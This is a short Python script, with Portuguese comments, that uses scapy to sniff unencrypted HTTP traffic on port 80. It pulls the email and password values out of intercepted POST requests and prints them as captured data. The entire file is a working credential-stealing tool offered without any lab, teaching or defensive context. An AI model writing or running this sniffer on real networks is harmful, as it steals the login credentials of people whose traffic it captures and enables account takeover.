from scapy.all import sniff, Raw

def processar(pacote):
    # Só pega pacotes que têm payload (Raw)
    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            # Filtra apenas POSTs com email ou passwd
            if "post" in data and ("email=" in data or "passwd=" in data):

                print("\n[🚨 DADOS CAPTURADOS 🚨]")
                print("-----------------------------------------")

                # Extrai email
                if "email=" in data:
                    email = data.split("email=", 1)[1].split("&")[0]
                    print(f"[EMAIL]  {email}")

                # Extrai senha
                if "passwd=" in data:
                    passwd = data.split("passwd=", 1)[1].split("&")[0]
                    print(f"[PASSWD] {passwd}")

                print("-----------------------------------------\n")

        except Exception:
            pass


# Sniff na porta 80 (HTTP)
print("[*] Sniffer ativo. Aguardando POSTs...")
sniff(filter="tcp port 80", prn=processar, store=False)
